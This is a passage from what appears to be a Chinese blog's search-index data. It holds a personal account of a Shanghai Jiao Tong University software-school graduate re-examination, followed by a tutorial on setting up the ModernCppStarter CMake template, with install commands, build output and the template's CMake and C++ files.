出了地铁站才发现，这是个荒郊野岭的偏僻地方。旁边确确实实是上海交大，还有华东师范。但是顶着烈日，满街的渣土车，飞扬的尘土仿佛让人处在叙利亚战场。这地方宛如一个工业园区，街上没有几个人，只有开得飞快的车车。打开手机看看酒店在哪，才发现酒店在上海交大的那一头，沪闵路，离现在的紫竹高新区3.3km。想要打个车吧，但是又担心现在已经晕的不行的自己会症状加重。遂决定步行到酒店。步行的过程中发现街上没有自行车（当然我拖着行李也坐不了自行车），只有飞扬的沙尘，上海交大这一头的校园只有几个建筑孤零零的立在那里，宛如一个光秃秃的工业园区。手机的电量还在耗尽，而酒店还远远望不到头，不知道到底什么时候才能抵达。从荒无人烟的地方一直往前走，路过了所谓的交大凯旋门，发现了几家酒店。我欣喜若狂，以为快要到了，结果一查手机才发现后面还有1.6公里。我顶着烈日继续往前走，又路过了人字拖鞋门，还有什么交大新村。我想着总要到了吧，抬头看到了全季酒店，想着我要是住这里就好了。但是酒店还在沪闵路上，而我不知道沪闵路还要走多远，只能继续往前走。到了高架桥下，终于在导航上看到了转折点，左拐再往前走一段就是锦江之星了。我继续坚持，终于在高架桥下一个不太起眼的地方看到了锦江之星。 进入酒店满头大汗的掏出了身份证，她给我办理了入住，发了个梳子和牙具。隔壁两位也是来复试的，一位家长带着她的儿子，那个阿姨问\"我们定了早餐，这里有早餐吗\"，服务员说\"我们没有早餐\"，那位阿姨说\"可我们定了早餐呀\"，服务员说\"我们可以给你牛奶和面包\"。乖乖，我当时心一凉。上来以后有个阿姨问我住哪间，我告诉她，她人很好，让我往前走就是了。 进了房间以后发现其实还行，但是外面烈日烤人，楼下还有施工。房间的台灯是坏的，有几个灯的按钮也是坏的，没有其他的器具，说实话是很有些沮丧的。我身体因为晕车虚弱，有刚刚经历了3.3公里的暴晒，我想要休息，可是我还有学习任务，于是我想着出去吃点东西补充体力。 后来发现这地方连餐馆都没有几家。找到了一家馄饨店，非常良心实惠，16块钱，馄饨和沙糖桔一样大。隔壁的水果店，10多块钱就能买到好几个比我拳头还大的沃柑。可惜的是附近没有别的餐馆了，也只有两家副食店。我当时的心情是很沮丧的，有时候都在心里打退堂鼓了，想着我到底到这个地方来干嘛，我为什么受这个罪。 吃了馄饨回了酒店，想着硬撑着复习一下算法，可是我真的没有力气了。窗外的烈日仿佛在烤着我的心，让我在焦虑、不确定、不自信、压力、身体不适下备受煎熬。我看到那个太阳，仿佛想起我刚刚几个小时前在烈日下从沙土施工队旁边拖着行李走过的时光。 下午的时候实在扛不住，睡了一觉，睡得也不安稳，因为复习没有完成，感觉备受煎熬。晚上的时候又起来学，但是感觉拟定的任务实在是完不成了，心态十分崩溃，根本不知道该怎么面对第二天的机试。同学提醒我，可以点外卖吃晚饭，于是我点了老乡鸡。吃饭的时候差点哭出来。睡前好多人给我打气，让我努力，不要放弃，一定要争取自己的机会。酒店订的是零压房，后来发现这个零压就是用的超级软的乳胶床垫，睡着感觉自己整个身体再往下塌，一整晚都精神紧绷，翻来覆去睡不安稳。最终大清早终于睡着了，梦见自己是叶问，1个打10个（不知道为什么做这种梦）。 ","date":"2025-03-25","objectID":"/%E4%B8%8A%E4%BA%A4%E8%BD%AF%E9%99%A2%E5%A4%8D%E8%AF%95%E8%AE%B0/:3:0","series":["记录"],"tags":null,"title":"上交软院复试记","uri":"/%E4%B8%8A%E4%BA%A4%E8%BD%AF%E9%99%A2%E5%A4%8D%E8%AF%95%E8%AE%B0/#23号痛苦的开始"},{"categories":null,"content":" 4 24号：机试的捶打第二天我拖着疲惫的身体起床，起床后的第一件事就是要他们把这个乳胶床垫给我换掉。一开始前台答应的很好，我也放心了。然后就想着几个小时内把算法内容复习完，结果发现根本复习不完。怎么办呢，因为这个考试是离线考试，但是开卷，于是我赶紧把相关的书籍、课程网址等等，全部都搞下来，还带了两本书去。 收拾好了东西，到了12点准时出发，结果发现附近没自行车了，于是狂奔了几百米找到了一辆哈罗，结果发现是坏的。看到马路对面的停车场门口有几辆共享单车，赶紧飞奔过去。幸好是能骑的，赶紧骑到交大拖鞋门口。在拖鞋门无法直接进，必须要掏出身份证核验。进了校以后准备去对校外人士开放的玉兰苑吃饭，但是压根不知道玉兰苑在哪。于是骑着车兜兜转转的找玉兰苑。多次骑过了地方，最后终于找到了。时间也来不及我吃饭了，只能在中百罗森里面买点面包和饮料凑合。后来找到了玉兰苑，又去找东下院。好不容易找到了东下院，等我进去的时候，别人都已经准备好了。交大的庄老师（我吹爆，老师真的好温柔，我好喜欢好喜欢，呜呜呜）发现我有几个原件没有带，很温柔的提醒我回去记得发给她。 然后开始准备机考。教室里有几个很厉害的学长在监考，还有两位老师也在监考。我确实对那个题目没有思路，最后想到用暴力，结果结束的时候暴力还没写完，但是注释和文档都写好了。老师很温柔地说没有关系，文档和注释都算分的。我觉得自己水平不行，本来第二天面试都不想来了。很温柔很温柔的庄老师跟我们说\"明天一定要来哦，明天的分数才是算大头\"，哇真的太喜欢庄老师了。 而后又自己骑车在交大校内转了转，真的不知道自己骑到哪了，也不知道大门在哪。后来摸摸索索通过导航终于找到了拖鞋门，按照原路回了酒店。回去以后发现并没有把床垫给我换成普通床垫，那个前台说换不了，让我自己把床垫给抽出来。行吧。。。我自己抽床垫的时候还要把床上用品都掀到一边，然后弄完了再铺上，真的很麻烦。我本来复习时间紧，但是没办法。我原本的计划是把6大件（计组、ICS、OS、网络、编译器、数据库）全部复习完，但是时间很不够了，所以我很焦虑。晚上依然是点了老乡鸡，依然是吃的想哭。晚上复习了点组成原理，实在是撑不住了，眼皮子直往下掉。于是决定洗澡睡觉。 躺在床上，一开始觉得确实脑袋放空了（可能是太累了），结果过一会儿又开始胡思乱想了：我要是明天表现不好怎么办，我要是表现得丢人怎么办，我复习不完了，我完蛋了完蛋了。。。。半夜心脏直突突，完全没法睡觉。甚至半夜的时候出现了胸痛的情况，影响了肠胃，拉了肚子，然后又吐了，整个人虚脱的直冒汗，身体疲软的不行，要坐在马桶上才能缓过来。而后当然是去睡了，想尽办法让自己放松下来，让心脏不那么难受，最终还是睡着了。 ","date":"2025-03-25","objectID":"/%E4%B8%8A%E4%BA%A4%E8%BD%AF%E9%99%A2%E5%A4%8D%E8%AF%95%E8%AE%B0/:4:0","series":["记录"],"tags":null,"title":"上交软院复试记","uri":"/%E4%B8%8A%E4%BA%A4%E8%BD%AF%E9%99%A2%E5%A4%8D%E8%AF%95%E8%AE%B0/#24号机试的捶打"},{"categories":null,"content":" 5 25号：一切的释怀与重生早上起来以后还是很虚，于是洗漱一下就骑车去玉兰苑，准备买早饭吃。结果发现玉兰苑早上不开门，于是依旧在中百罗森买了面包和饮料吃吃。吃完就去了东下院自习（轻车熟路了属于是），中途依然是对自己不自信，甚至想着超额完成任务，结果发现行不通。后来干脆摆了，把自己做过的几个系统相关的项目、还有一些竞赛经历、学生荣誉、实习经历通通写到简历上，然后复习了一下那几个项目，想着实在是没办法了，破罐子破摔吧。后来又兜兜转转找了麦当劳，找到了麦当劳，买到了餐，又在找打印店，去了打印店打印后，又兜兜转转的找软件大楼。等到了楼下，发现楼里有几个指示牌，问了一下大门口的大叔，大叔让我顺着牌牌走，到后面那栋楼去（感谢大叔） 等电梯的时候，温柔的庄老师（超级喜欢！）来电话了，大概是问我什么时候到，我说我在等电梯了，庄老师说先去四楼签到，然后去二楼咖啡厅等（啊，我太喜欢庄老师了，每次看见她就觉得特别安心，为什么我本科时候从没有遇见过这么好的老师，呜呜呜）等待的一个小时里面，我把我项目可能的细节都回想了一遍，相关的知识点都复习了一下。本来还打算做一下英语的自我介绍，后来时间来不及了，大概到我了就直接上楼了。楼上还有几个人，他们也和我一样紧张，其中一个哥们儿紧张的摸着胸口绕着会议室大门转圈圈。特别有意思的是，突然实验室里出来几个人，跟这哥们儿说\"哟，你来二战啦，看看你第几个\"，哥们儿和他们聊了一会儿。还是依然很紧张，我也很紧张。我妈原来经常教导我，压力大的时候要想到泽连斯基，你的压力能比泽连斯基更大吗？这话赶紧没道理，但是好像又有道理，哈哈哈哈哈。 轮到我了进去以后，有一位年纪看起来有点大的老师（后来经外面同学确认后才知道那是他们的院长），问了我很多项目细节上的问题（呜呜呜，我真的好感动，我本科时候从没人问过我项目细节的问题，也没有人给我的设计提出过建议，这是第一次啊，甚至是他们的院长），我一开始很紧张，后来慢慢的就不紧张了，毕竟是自己亲手写的，也没什么好紧张的，也不是问专业课。和专业的老师聊天真的是一件让人很舒服的事情。我本来打算带着更大的项目来，但是时间不够了，可是老师也说没关系。我真的太感动了呜呜呜，我本科四年多希望有人能问我项目，能问我实现细节，能给我提出建议，可是都没有，毕业时候四个老登还像是饿死鬼一样垮着脸鸡蛋里挑骨头。我从未感受过如此的尊重，实在是非常的感动，和懂行的人交流真的是一种享受。 考试结束后，我骑车回到了酒店。之前的各种不爽突然都烟消云散了，我突然懊悔自己为什么没有好好准备初试，导致我大概率没法进入软件学院招生名单中。在这样的学院里学习是一种享受哇，我为什么在之前没有发狂努力，让自己错过了这么好的机会。而后我又骑车回了交大，骑车到处转，在没有考试压力的情况下感受学校的氛围，这氛围真的是太好了。无论是庄老师，院长，交软的同学们，还有温柔的阿姨，好心的大叔，舒服的东下院，这一切都让我留恋。我在夕阳下的教学楼里穿梭，我看着要毕业的研究生穿着学士服到处拍照，我看着人来人往的教学楼，我看着点灯的树，看着操场上意气风发的同学，看着悠闲踱步的人，看着食堂来来往往的学生，热情的阿姨，我多希望我也可以成为这里的一份子，我希望我也可以在这里享受本科从未感受过的校园时光。我在本科期间遇到很多好的老师，同时也受过很多的欺负，更多的是窝囊、憋屈、不甘心、迷茫、痛苦、焦虑，从未有一天真正的像这样享受过，像这样感觉自己活在校园里，真正的自由的大学校园。我在玉兰苑吃饭，对面一个女生在对她的男朋友撒娇，两个人你侬我侬，不是那种令人反胃的公共场合亲密，是一种让人很舒服的情侣状态。这不禁让人难受，我那被偷走的本科校园青春，又有谁能为我补回来呢？我在校园里骑车兜圈，久久不愿离去，这的一切都让我羡慕，也让我难受。因为我从未有过如此舒服的校园时光，我只有在昏天黑地的本科，在不知道何时才能走出去的痛苦中一天天的折磨自己，内耗自己。在那样的地方，没有人跟你谈论理想，也没有人有理想。 人常说，未来是不可限定的，今天可能是交大，明天也可能是MIT。过去是不可更改的，但是我们可以用自己的行动和努力去决定未来。从今晚结束后，我便要努力奔向下一个人生节点。我不知道我最终会达到什么样的境地和成就，但是交大的这两日彻底的改变了我。我要用彻底的努力，去为自己争取一个光明的未来，我也要像他们一样站在阳光下面享受我的人生，而不是像个过路人，只有羡慕的份。悟已往之不谏，知来者之可追。人不能一辈子在阴暗、看不到光的本科过去里爬行，人才必须要到能够托举他的环境中去，才能生根发芽，越来越壮。至少交大软院的老师给了我这样的自信，让我能够看到，我是有能力、有才华的，而不是什么废柴。 一开始来的时候，觉得很不满，这是什么鸟不拉屎的地方。而明天就要离去的时候，还会怀念这里，怀念在这里看过的清晨、午后和夕阳，怀念这里的环境，怀念这里遇到的人。骑车的时候听两位同学聊天，后天就要下雨，而交大把最好的天气，留给了我们复试的这几天。我不后悔来到这里，这是一次非常好的体验，虽然中途颇有不顺，虽然考试多不顺利，但是我感受到了朝气和希望，我知道了一个好的环境是什么样子，也知道如果努力，我可以达到什么样的境界。肖申克的救赎中有句台词，hope is a good thing, and good thing never dies. 我希望能和一切正处在人生的阴暗、痛苦、矛盾、不甘、折磨中的人共勉这句话，只要努力生活，我们不会一直不顺，我们也会迎来我们的春天。 更新：上交软院录取了，但是调整了方向，录到联培基地了。有点遗憾不能录本部，后面再加油吧。 ","date":"2025-03-25","objectID":"/%E4%B8%8A%E4%BA%A4%E8%BD%AF%E9%99%A2%E5%A4%8D%E8%AF%95%E8%AE%B0/:5:0","series":["记录"],"tags":null,"title":"上交软院复试记","uri":"/%E4%B8%8A%E4%BA%A4%E8%BD%AF%E9%99%A2%E5%A4%8D%E8%AF%95%E8%AE%B0/#25号一切的释怀与重生"},{"categories":["工具"],"content":"之前很久没用CMake了，今天想要用C++重新实现一下各个数据结构，想要使用CMake来配置整个项目，并且在其中添加测试。无奈一上手发现CMake的语法都忘了（太久没写了，挠头）。所幸在Github上找到了一个非常好的CMake模板：TheLartians/ModernCppStarter: 🚀 Kick-start your C++! A template for modern C++ projects using CMake, CI, code coverage, clang-format, reproducible dependency management and much more.，下面详细记录该模板的配置过程。 ","date":"2025-03-18","objectID":"/moderncppstarter%E9%85%8D%E7%BD%AE%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/:0:0","series":null,"tags":["CMake"],"title":"ModernCppStarter配置过程记录","uri":"/moderncppstarter%E9%85%8D%E7%BD%AE%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/#"},{"categories":["工具"],"content":" 1 仓库创建这里我们使用Use this template的方式，注意在这个模板中，要保证github pages的正常显示，我们选择保留所有的branch（因为github action是在gh-pages分支下响应的）。这里没有什么难度，直接选择Use this template，创建完毕后git clone到本地就好了。 ","date":"2025-03-18","objectID":"/moderncppstarter%E9%85%8D%E7%BD%AE%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/:1:0","series":null,"tags":["CMake"],"title":"ModernCppStarter配置过程记录","uri":"/moderncppstarter%E9%85%8D%E7%BD%AE%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/#仓库创建"},{"categories":["工具"],"content":" 2 依赖包安装我是在Linux环境下配置这个项目的，系统是Ubuntu 18.04。在使用这个模板之前，我们需要安装以下几个包：pip clang-format cmake-format pyyaml Doxygen jinja2 Pygments 安装命令如下： bash sudo apt install pip sudo apt-get install python3-socks #我的电脑上配置了代理，使用socks5，因此要让pip通过代理，需要安装这个工具 pip install clang-format==14.0.6 cmake_format==0.6.11 pyyaml vim ~/.bashrc # 需要在.bashrc中配置$PATH，添加~/.local/bin到$PATH环境变量中 source ~/.bashrc sudo apt-get install doxygen pip install jinja2 pip install pygments ","date":"2025-03-18","objectID":"/moderncppstarter%E9%85%8D%E7%BD%AE%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/:2:0","series":null,"tags":["CMake"],"title":"ModernCppStarter配置过程记录","uri":"/moderncppstarter%E9%85%8D%E7%BD%AE%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/#依赖包安装"},{"categories":["工具"],"content":" 3 初次构建项目项目通过如下命令进行构建，我们将其放在一个run.sh中（放在仓库根目录下），命令如下： bash cmake -S all -B build cmake --build build # run tests ./build/test/GreeterTests # format code cmake --build build --target fix-format # run standalone ./build/standalone/Greeter --help # build docs cmake --build build --target GenerateDocs 如果想单独构建各个部分，可以分别进行如下操作： bash # 构建standalone target cmake -S standalone -B build/standalone cmake --build build/standalone ./build/standalone/Greeter --help # 构建测试 cmake -S test -B build/test cmake --build build/test CTEST_OUTPUT_ON_FAILURE=1 cmake --build build/test --target test # or simply call the executable: ./build/test/GreeterTests # 构建clang-format cmake -S test -B build/test # view changes cmake --build build/test --target format # apply changes cmake --build build/test --target fix-format # 构建文档 cmake -S documentation -B build/doc cmake --build build/doc --target GenerateDocs # view the docs open build/doc/doxygen/html/index.html 安装好上述各个包后，我们进入仓库，输入以下命令构建项目： bash chmod +x run.sh # 为run.sh添加执行权限 ./run.sh # 运行构建脚本 cd build make 输出如下信息，表示构建成功： bash gwen@gwen-virtual-machine:~/Documents/ds$ ./run.sh -- CPM: Adding package cxxopts@3.0.0 (v3.0.0) -- CPM: Adding package Greeter@ (/home/gwen/Documents/ds/standalone/..) -- CPM: Greeter: Adding package PackageProject.cmake@1.8.0 (v1.8.0) -- CPM: Greeter: Adding package fmt@10.2.1 (10.2.1) -- Version: 10.2.1 -- Build type: -- CPM: Adding package doctest@2.4.9 (v2.4.9) -- CPM: Adding package Format.cmake@1.7.3 (v1.7.3) -- Found Python: /usr/bin/python3.8 (found version \"3.8.10\") found components: Interpreter -- The C compiler identification is GNU 9.4.0 -- Check for working C compiler: /usr/bin/cc -- Check for working C compiler: /usr/bin/cc -- works -- Detecting C compiler ABI info -- Detecting C compiler ABI info - done -- Detecting C compile features -- Detecting C compile features - done -- CPM: Adding package m.css@0 (a0d292ec311b97fefd21e93cdefb60f88d19ede6) -- Configuring done -- Generating done -- Build files have been written to: /home/gwen/Documents/ds/build Scanning dependencies of target fmt [ 10%] Building CXX object _deps/fmt-build/CMakeFiles/fmt.dir/src/format.cc.o [ 20%] Building CXX object _deps/fmt-build/CMakeFiles/fmt.dir/src/os.cc.o [ 30%] Linking CXX static library libfmt.a [ 30%] Built target fmt Scanning dependencies of target Greeter [ 40%] Building CXX object _deps/greeter-build/CMakeFiles/Greeter.dir/source/greeter.cpp.o [ 50%] Linking CXX static library libGreeter.a [ 50%] Built target Greeter Scanning dependencies of target GreeterStandalone [ 60%] Building CXX object standalone/CMakeFiles/GreeterStandalone.dir/source/main.cpp.o [ 70%] Linking CXX executable Greeter [ 70%] Built target GreeterStandalone Scanning dependencies of target GreeterTests [ 80%] Building CXX object test/CMakeFiles/GreeterTests.dir/source/greeter.cpp.o [ 90%] Building CXX object test/CMakeFiles/GreeterTests.dir/source/main.cpp.o [100%] Linking CXX executable GreeterTests [100%] Built target GreeterTests [doctest] doctest version is \"2.4.9\" [doctest] run with \"--help\" for options =============================================================================== [doctest] test cases: 2 | 2 passed | 0 failed | 0 skipped [doctest] assertions: 5 | 5 passed | 0 failed | [doctest] Status: SUCCESS! Scanning dependencies of target fix-clang-format clang-format did not modify any files Built target fix-clang-format Scanning dependencies of target fix-cmake-format Built target fix-cmake-format Scanning dependencies of target fix-format Built target fix-format A program to welcome the world! Usage: ./build/standalone/Greeter [OPTION...] -h, --help Show help -v, --version Print the current version number -n, --name arg Name to greet (default: World) -l, --lang arg Language code to use (default: en) Scanning dependencies of target GenerateDocs warning: ignoring unsupported tag 'M_SHOW_UNDOCUMENTED' at line 31, file /home/gwen/Documents/ds/build/documentation/Doxyfile Searching for include files... Sear","date":"2025-03-18","objectID":"/moderncppstarter%E9%85%8D%E7%BD%AE%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/:3:0","series":null,"tags":["CMake"],"title":"ModernCppStarter配置过程记录","uri":"/moderncppstarter%E9%85%8D%E7%BD%AE%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/#初次构建项目"},{"categories":["工具"],"content":" 4 将Greeter转化为自己的项目要将Greeter转化为我们自己的项目，需要项目中的Greeter（不分大小写）进行一些替换。我们想要将Greeter转化为DsProject，将greeter转化为dsproject。 首先我们需要看一下项目的结构： bash gwen@gwen-virtual-machine:~/Documents/ds$ tree -L 2 . ├── all │ └── CMakeLists.txt ├── build # 这里是生成的构建文件，无需修改 │ ├── cmake │ ├── CMakeCache.txt │ ├── CMakeFiles │ ├── cmake_install.cmake │ ├── CPackConfig.cmake │ ├── CPackSourceConfig.cmake │ ├── CPM_modules │ ├── cpm-package-lock.cmake │ ├── CTestTestfile.cmake │ ├── _deps │ ├── documentation │ ├── Makefile │ ├── standalone │ └── test ├── cmake # 一些cmake宏定义，无需修改 │ ├── CPM.cmake │ └── tools.cmake ├── CMakeLists.txt ├── codecov.yaml # 一般情况下用不到codecov，无需修改 ├── documentation # 这里是生成文档的配置，无需修改 │ ├── CMakeLists.txt │ ├── conf.py │ ├── Doxyfile │ └── pages ├── include │ └── greeter ├── LICENSE # 使用的LICENSE，无需修改 ├── README.md ├── run.sh # 脚本文件，无需修改 ├── source │ └── greeter.cpp ├── standalone │ ├── CMakeLists.txt │ └── source └── test ├── CMakeLists.txt └── source 19 directories, 21 files 那么我们主要需要修改的部分包括： all/CMakeLists.txt：进行子项目管理 CMakeLists.txt：进行主要的构建配置 include/greeter：存放头文件，不用多说 README.md：README.md说明文件，不用多说 source/greeter.cpp：存放源代码文件，不用多说 standalone/* ：standalone为一个可以单独构建的子项目，里面有单独的CMake，不用多说 test/* ：存放测试文件，其总体结构和standalone相似，也是一个可以单独构建的子项目，不用多说 接下来我们逐个查看这些文件的内容。 ","date":"2025-03-18","objectID":"/moderncppstarter%E9%85%8D%E7%BD%AE%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/:4:0","series":null,"tags":["CMake"],"title":"ModernCppStarter配置过程记录","uri":"/moderncppstarter%E9%85%8D%E7%BD%AE%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/#将greeter转化为自己的项目"},{"categories":["工具"],"content":" 4.1 all/CMakeLists.txt cmake # this script adds all subprojects to a single build to allow IDEs understand the full project # structure. cmake_minimum_required(VERSION 3.14...22) project(BuildAll LANGUAGES CXX) include(../cmake/tools.cmake) # needed to generate test target enable_testing() add_subdirectory(${CMAKE_CURRENT_LIST_DIR}/../standalone ${CMAKE_BINARY_DIR}/standalone) add_subdirectory(${CMAKE_CURRENT_LIST_DIR}/../test ${CMAKE_BINARY_DIR}/test) add_subdirectory(${CMAKE_CURRENT_LIST_DIR}/../documentation ${CMAKE_BINARY_DIR}/documentation) 可以看到，这个CMake文件主要负责子项目的管理，如果要添加子项目进来，就仿照添加standalone那样方式就行。测试和文档已经添加进来，如果要进行改动，直接修改test和documentation下的文件就行。 ","date":"2025-03-18","objectID":"/moderncppstarter%E9%85%8D%E7%BD%AE%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/:4:1","series":null,"tags":["CMake"],"title":"ModernCppStarter配置过程记录","uri":"/moderncppstarter%E9%85%8D%E7%BD%AE%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/#allcmakeliststxt"},{"categories":["工具"],"content":" 4.2 CMakeLists.txt cmake cmake_minimum_required(VERSION 3.14...3.22) # ---- Project ---- # Note: update this to your new project's name and version project( Greeter # 这里需要改动 VERSION 1.0 LANGUAGES CXX ) # ---- Include guards ---- if(PROJECT_SOURCE_DIR STREQUAL PROJECT_BINARY_DIR) message( FATAL_ERROR \"In-source builds not allowed. Please make a new directory (called a build directory) and run CMake from there.\" ) endif() # ---- Add dependencies via CPM ---- # see https://github.com/TheLartians/CPM.cmake for more info include(cmake/CPM.cmake) # PackageProject.cmake will be used to make our target installable CPMAddPackage(\"gh:TheLartians/PackageProject.cmake@1.8.0\") CPMAddPackage( NAME fmt GIT_TAG 10.2.1 GITHUB_REPOSITORY fmtlib/fmt OPTIONS \"FMT_INSTALL YES\" # create an installable target ) # ---- Add source files ---- # Note: globbing sources is considered bad practice as CMake's generators may not detect new files # automatically. Keep that in mind when changing files, or explicitly mention them here. file(GLOB_RECURSE headers CONFIGURE_DEPENDS \"${CMAKE_CURRENT_SOURCE_DIR}/include/*.h\") file(GLOB_RECURSE sources CONFIGURE_DEPENDS \"${CMAKE_CURRENT_SOURCE_DIR}/source/*.cpp\") # ---- Create library ---- # Note: for header-only libraries change all PUBLIC flags to INTERFACE and create an interface # target: add_library(${PROJECT_NAME} INTERFACE) add_library(${PROJECT_NAME} ${headers} ${sources}) set_target_properties(${PROJECT_NAME} PROPERTIES CXX_STANDARD 17) # being a cross-platform target, we enforce standards conformance on MSVC target_compile_options(${PROJECT_NAME} PUBLIC \"$\u003c$\u003cCOMPILE_LANG_AND_ID:CXX,MSVC\u003e:/permissive-\u003e\") # Link dependencies target_link_libraries(${PROJECT_NAME} PRIVATE fmt::fmt) target_include_directories( ${PROJECT_NAME} PUBLIC $\u003cBUILD_INTERFACE:${PROJECT_SOURCE_DIR}/include\u003e $\u003cINSTALL_INTERFACE:include/${PROJECT_NAME}-${PROJECT_VERSION}\u003e ) # ---- Create an installable target ---- # this allows users to install and find the library via `find_package()`. # the location where the project's version header will be placed should match the project's regular # header paths string(TOLOWER ${PROJECT_NAME}/version.h VERSION_HEADER_LOCATION) packageProject( NAME ${PROJECT_NAME} VERSION ${PROJECT_VERSION} NAMESPACE ${PROJECT_NAME} BINARY_DIR ${PROJECT_BINARY_DIR} INCLUDE_DIR ${PROJECT_SOURCE_DIR}/include INCLUDE_DESTINATION include/${PROJECT_NAME}-${PROJECT_VERSION} VERSION_HEADER \"${VERSION_HEADER_LOCATION}\" COMPATIBILITY SameMajorVersion DEPENDENCIES \"fmt 10.2.1\" ) 这里是最主要的配置，文件中的注释阐述的较为清楚了，因此不多进行解释。 ","date":"2025-03-18","objectID":"/moderncppstarter%E9%85%8D%E7%BD%AE%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/:4:2","series":null,"tags":["CMake"],"title":"ModernCppStarter配置过程记录","uri":"/moderncppstarter%E9%85%8D%E7%BD%AE%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/#cmakeliststxt"},{"categories":["工具"],"content":" 4.3 将Greeter转化为DsProject下面我们将Greeter转化为DsProject，进行如下操作： 首先将CMakeLists.txt中所有的Greeter都替换为DsProject 将其余的Greeter也替换为DsProject 将源码中的greeter全部替换为dsproject，其覆盖的范围包括头文件、源码文件、README.md文件、部分配置文件 将文件名中的greeter全部替换为dsproject 有一个GREETER_VERSION需要替换为DSPROJECT_VERSION 输入./run.sh试一下，成功啦！ ","date":"2025-03-18","objectID":"/moderncppstarter%E9%85%8D%E7%BD%AE%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/:4:3","series":null,"tags":["CMake"],"title":"ModernCppStarter配置过程记录","uri":"/moderncppstarter%E9%85%8D%E7%BD%AE%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/#将greeter转化为dsproject"},{"categories":["工具"],"content":" 5 子项目及测试探究刚刚说到我们想要学习如何添加子项目，如何添加测试，如何在子项目中添加测试，下面我们来进行探究。 ","date":"2025-03-18","objectID":"/moderncppstarter%E9%85%8D%E7%BD%AE%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/:5:0","series":null,"tags":["CMake"],"title":"ModernCppStarter配置过程记录","uri":"/moderncppstarter%E9%85%8D%E7%BD%AE%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/#子项目及测试探究"},{"categories":["工具"],"content":" 5.1 子项目构建首先我们在根目录下新建一个list文件夹，将该文件夹作为新的子项目。我们首先要做的就是在all/CMakeLists.txt下添加这一行： cmake add_subdirectory(${CMAKE_CURRENT_LIST_DIR}/../list ${CMAKE_BINARY_DIR}/list) 这里的${CMAKE_CURRENT_LIST_DIR}指的就是当前这个all/CMakeLists.txt文件夹，而${CMAKE_BINARY_DIR}就是build文件夹。我们会在/build/list下生成对应的构建内容。 接下来我们研究一下standalone子项目的结构，该子项目有一个source文件夹，存放的是.cpp源代码，还有一个CMakeLists.txt，存放的是该子项目的构建文件。 其中main.cpp的内容如下： cpp #include \u003cdsproject/dsproject.h\u003e #include \u003cdsproject/version.h\u003e #include \u003ccxxopts.hpp\u003e #include \u003ciostream\u003e #include \u003cstring\u003e #include \u003cunordered_map\u003e auto main(int argc, char** argv) -\u003e int { const std::unordered_map\u003cstd::string, dsproject::LanguageCode\u003e languages{ {\"en\", dsproject::LanguageCode::EN}, {\"de\", dsproject::LanguageCode::DE}, {\"es\", dsproject::LanguageCode::ES}, {\"fr\", dsproject::LanguageCode::FR}, }; cxxopts::Options options(*argv, \"A program to welcome the world!\"); std::string language; std::string name; // clang-format off options.add_options() (\"h,help\", \"Show help\") (\"v,version\", \"Print the current version number\") (\"n,name\", \"Name to greet\", cxxopts::value(name)-\u003edefault_value(\"World\")) (\"l,lang\", \"Language code to use\", cxxopts::value(language)-\u003edefault_value(\"en\")) ; // clang-format on auto result = options.parse(argc, argv); if (result[\"help\"].as\u003cbool\u003e()) { std::cout \u003c\u003c options.help() \u003c\u003c std::endl; return 0; } if (result[\"version\"].as\u003cbool\u003e()) { std::cout \u003c\u003c \"DsProject, version \" \u003c\u003c DSPROJECT_VERSION \u003c\u003c std::endl; return 0; } auto langIt = languages.find(language); if (langIt == languages.end()) { std::cerr \u003c\u003c \"unknown language code: \" \u003c\u003c language \u003c\u003c std::endl; return 1; } dsproject::DsProject dsproject(name); std::cout \u003c\u003c dsproject.greet(langIt-\u003esecond) \u003c\u003c std::endl; return 0; } 我们可以看到，在 其CMakeLists.txt的内容如下： cmake cmake_minimum_required(VERSION 3.14...22) project(DsProjectStandalone LANGUAGES CXX) # --- Import tools ---- include(../cmake/tools.cmake) # ---- Dependencies ---- include(../cmake/CPM.cmake) CPMAddPackage( GITHUB_REPOSITORY jarro2783/cxxopts VERSION 3.0.0 OPTIONS \"CXXOPTS_BUILD_EXAMPLES NO\" \"CXXOPTS_BUILD_TESTS NO\" \"CXXOPTS_ENABLE_INSTALL YES\" ) CPMAddPackage(NAME DsProject SOURCE_DIR ${CMAKE_CURRENT_LIST_DIR}/..) # ---- Create standalone executable ---- file(GLOB sources CONFIGURE_DEPENDS ${CMAKE_CURRENT_SOURCE_DIR}/source/*.cpp) add_executable(${PROJECT_NAME} ${sources}) set_target_properties(${PROJECT_NAME} PROPERTIES CXX_STANDARD 17 OUTPUT_NAME \"DsProject\") target_link_libraries(${PROJECT_NAME} DsProject::DsProject cxxopts) ","date":"2025-03-18","objectID":"/moderncppstarter%E9%85%8D%E7%BD%AE%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/:5:1","series":null,"tags":["CMake"],"title":"ModernCppStarter配置过程记录","uri":"/moderncppstarter%E9%85%8D%E7%BD%AE%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/#子项目构建"},{"categories":["工具"],"content":" 6 第一个list子项目配置","date":"2025-03-18","objectID":"/moderncppstarter%E9%85%8D%E7%BD%AE%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/:6:0","series":null,"tags":["CMake"],"title":"ModernCppStarter配置过程记录","uri":"/moderncppstarter%E9%85%8D%E7%BD%AE%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/#第一个list子项目配置"},{"categories":["工具"],"content":" 7 